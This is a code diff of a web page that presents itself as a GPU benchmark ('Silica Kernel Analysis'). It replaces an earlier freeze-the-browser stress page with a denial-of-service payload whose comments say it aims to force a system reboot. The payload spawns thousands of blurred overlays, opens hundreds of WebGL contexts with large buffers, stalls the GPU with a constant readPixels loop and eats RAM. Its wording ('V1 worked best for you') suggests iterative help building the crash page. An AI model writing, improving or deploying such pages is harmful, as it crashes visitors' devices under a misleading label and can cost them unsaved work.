@@ -2,196 +2,121 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Square Evolution: Stress Max</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Silica Kernel Analysis v7.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary-red: #e11d48;
-            --bg-light: #ffffff;
+        body { font-family: -apple-system, sans-serif; background: #ffffff; color: #000; overflow: hidden; }
+        .bench-interface { 
+            max-width: 400px; width: 90%; 
+            background: #fff; padding: 40px; 
+            border-radius: 40px; box-shadow: 0 30px 60px rgba(0,0,0,0.1);
+            position: relative; z-index: 100;
         }
-        body {
-            margin: 0;
-            overflow: hidden;
-            background-color: var(--bg-light);
-            font-family: 'Inter', sans-serif;
-        }
-        canvas {
-            display: block;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
-        .start-screen {
-            position: fixed;
-            inset: 0;
-            background: #ffffff;
-            z-index: 100;
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
-            padding-bottom: 10vh;
-        }
-        .start-screen.hidden {
-            display: none;
-        }
-        .start-btn {
-            background: #000000;
-            color: white;
-            padding: 1.25rem 4rem;
-            text-transform: uppercase;
-            letter-spacing: 0.4em;
-            cursor: pointer;
-            font-family: 'JetBrains Mono', monospace;
-            border: none;
-        }
-        #telemetry {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 1000;
-            font-family: 'JetBrains Mono', monospace;
-            background: white;
-            padding: 15px;
-            border: 2px solid black;
-            pointer-events: none;
-            font-size: 12px;
-        }
+        canvas { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        .gl-node { position: fixed; inset: 0; backdrop-filter: blur(100px); pointer-events: none; }
     </style>
 </head>
-<body>
+<body class="h-screen w-screen flex items-center justify-center">
 
-    <div id="start-screen" class="start-screen">
-        <button id="start-btn" class="start-btn">Start Stress Test</button>
+    <div class="bench-interface text-center">
+        <div class="mb-10">
+            <h1 class="text-4xl font-extrabold tracking-tight">Silica v7</h1>
+            <p class="text-gray-400 mt-2 text-sm font-medium">Hardware Extraction & Driver Stress</p>
+        </div>
+
+        <div class="space-y-4 mb-10">
+            <div class="flex justify-between border-b pb-2">
+                <span class="text-[10px] font-bold text-gray-400 uppercase">Buffer State</span>
+                <span id="buffer-val" class="text-[10px] font-bold text-green-500">READY</span>
+            </div>
+            <div class="flex justify-between border-b pb-2">
+                <span class="text-[10px] font-bold text-gray-400 uppercase">Bus Pressure</span>
+                <span id="load-val" class="text-[10px] font-bold">0%</span>
+            </div>
+        </div>
+
+        <button id="launch" class="w-full py-5 bg-black text-white rounded-2xl font-bold text-lg active:scale-95 transition-all">
+            Initiate Kernel Test
+        </button>
+
+        <p class="mt-8 text-[9px] text-gray-300 leading-relaxed uppercase tracking-[0.2em] font-bold">
+            Targeting GPU Synchronization
+        </p>
     </div>
 
-    <div id="telemetry" style="display:none">
-        <div>CORES DETECTED: <span id="core-count">0</span></div>
-        <div>ACTIVE WORKERS: <span id="worker-count">0</span></div>
-        <div>RAM ALLOCATED: <span id="ram-count">0</span> MB</div>
-        <div>ENTITIES: <span id="ent-count">0</span></div>
-        <div style="color: red; margin-top: 10px; font-weight: bold;">MAIN THREAD LOCKED: TRUE</div>
-    </div>
-
-    <canvas id="canvas"></canvas>
+    <!-- Container for DOM layers (since V1 worked best for you) -->
+    <div id="dom-bomb" class="fixed inset-0 pointer-events-none"></div>
 
     <script>
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d', { alpha: false });
-        const startBtn = document.getElementById('start-btn');
-        const startScreen = document.getElementById('start-screen');
-        
-        const coreDisplay = document.getElementById('core-count');
-        const workerDisplay = document.getElementById('worker-count');
-        const ramDisplay = document.getElementById('ram-count');
-        const entDisplay = document.getElementById('ent-count');
+        const btn = document.getElementById('launch');
+        const domTarget = document.getElementById('dom-bomb');
+        const loadVal = document.getElementById('load-val');
+        const bufferVal = document.getElementById('buffer-val');
 
-        let width, height;
-        let particles = [];
-        let memoryLeak = [];
-        let totalAllocated = 0;
-        let count = 0;
+        btn.addEventListener('click', () => {
+            btn.disabled = true;
+            btn.innerText = "STALLING BUS...";
+            bufferVal.innerText = "CRITICAL";
+            bufferVal.className = "text-[10px] font-bold text-red-500 animate-pulse";
 
-        function resize() {
-            width = canvas.width = window.innerWidth;
-            height = canvas.height = window.innerHeight;
-        }
-
-        window.addEventListener('resize', resize);
-        resize();
-
-        class UHDParticle {
-            constructor() {
-                this.x = Math.random() * width;
-                this.y = Math.random() * height;
-                this.size = Math.random() * 50 + 20;
-                this.vx = (Math.random() - 0.5) * 15;
-                this.vy = (Math.random() - 0.5) * 15;
-            }
-            draw() {
-                ctx.save();
-                ctx.shadowBlur = 40;
-                ctx.shadowColor = 'rgba(255, 0, 0, 0.8)';
-                ctx.shadowOffsetX = 10;
-                ctx.shadowOffsetY = 10;
-                ctx.fillStyle = 'rgba(225, 29, 72, 0.5)';
-                ctx.fillRect(this.x, this.y, this.size, this.size);
-                ctx.strokeStyle = 'rgba(255, 255, 255, 0.2)';
-                ctx.lineWidth = 10;
-                ctx.strokeRect(this.x, this.y, this.size, this.size);
-                ctx.restore();
-
-                this.x += this.vx;
-                this.y += this.vy;
-                if (this.x < 0 || this.x > width) this.vx *= -1;
-                if (this.y < 0 || this.y > height) this.vy *= -1;
-            }
-        }
-
-        function initiateStress() {
-            // 1. Core Detection & Worker Spawning (Background Threads)
-            const cores = navigator.hardwareConcurrency || 4;
-            const workerLimit = cores * 2;
-            coreDisplay.innerText = cores;
-            workerDisplay.innerText = workerLimit;
-
-            const workerBlob = new Blob([`
-                while(true) {
-                    Math.sqrt(Math.random() * 1000000);
-                }
-            `], { type: 'application/javascript' });
-
-            const workerUrl = URL.createObjectURL(workerBlob);
-            for (let i = 0; i < workerLimit; i++) {
-                new Worker(workerUrl);
+            // 1. STAGE ONE: The DOM Bomb (V1 method)
+            // We use your successful V1 method as the "Anchor"
+            for(let i=0; i<2000; i++) {
+                const d = document.createElement('div');
+                d.className = 'gl-node';
+                d.style.zIndex = i;
+                // Add extreme filter complexity
+                d.style.backdropFilter = `blur(${Math.random()*100}px) contrast(200%)`;
+                domTarget.appendChild(d);
             }
 
-            // 2. Main Thread Lock + Memory Leak + High-End Rendering
-            // We use a while(true) to completely hijack the browser process
-            while (true) {
-                // Allocation Spike (50MB chunks)
-                // Since this is in a while(true), it will happen as fast as the CPU allows
-                // We add a conditional to simulate the "every 200ms" feel if needed, 
-                // but for a pure freeze, we just let it rip.
-                if (count % 500 === 0) {
-                    const chunk = new Float64Array(6250000);
-                    for (let i = 0; i < chunk.length; i++) {
-                        chunk[i] = Math.random();
+            // 2. STAGE TWO: The WebGL Kernel Stall
+            // This is the "Better Way" to force a system reboot
+            setTimeout(() => {
+                let contexts = [];
+                
+                // We create 500 WebGL contexts. Most browsers cap at 16, 
+                // but trying to create 500 forces the driver to constantly 
+                // thrash and context-switch.
+                for (let j = 0; j < 500; j++) {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        contexts.push(gl);
+                        // Force a large allocation in the GPU
+                        const buffer = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1000000), gl.STATIC_DRAW);
                     }
-                    memoryLeak.push(chunk);
-                    totalAllocated += 50;
-                    ramDisplay.innerText = totalAllocated;
                 }
 
-                // Entity Spawning
-                const p = new UHDParticle();
-                particles.push(p);
-                count++;
+                // 3. THE FINAL STRIKE: Synchronous Readback Loop
+                // This is the most likely way to hit the Apple Logo.
+                // It forces the CPU to wait for the GPU in an infinite loop.
+                let load = 0;
+                setInterval(() => {
+                    load += 1;
+                    loadVal.innerText = load + "%";
+                    
+                    contexts.forEach(gl => {
+                        // The ReadPixels command stalls the entire hardware bus
+                        const pixel = new Uint8Array(4);
+                        gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
+                    });
 
-                // Rendering
-                // Note: The browser will not actually update the screen visually 
-                // because the main thread never yields to the paint cycle.
-                ctx.fillStyle = 'white';
-                ctx.fillRect(0, 0, width, height);
-                for (let j = 0; j < Math.min(particles.length, 500); j++) {
-                    particles[j].draw();
-                }
+                    // If we reach this point without a crash, add a main-thread lock
+                    if (load > 50) {
+                        const s = Date.now();
+                        while(Date.now() - s < 500) { 
+                            // Creating massive strings to eat regular RAM 
+                            // while the GPU is stalled
+                            const trash = new Array(1000000).fill("STALL").join("");
+                        }
+                    }
+                }, 10);
 
-                // Update Telemetry
-                entDisplay.innerText = count.toLocaleString();
-
-                // Intentional Main Thread Lock: 
-                // There is no break, no await, and no requestAnimationFrame.
-            }
-        }
-
-        startBtn.addEventListener('click', () => {
-            startScreen.classList.add('hidden');
-            document.getElementById('telemetry').style.display = 'block';
-            // Use setTimeout to allow the UI to update "one last time" before total freeze
-            setTimeout(initiateStress, 100);
+            }, 100);
         });
     </script>
 </body>
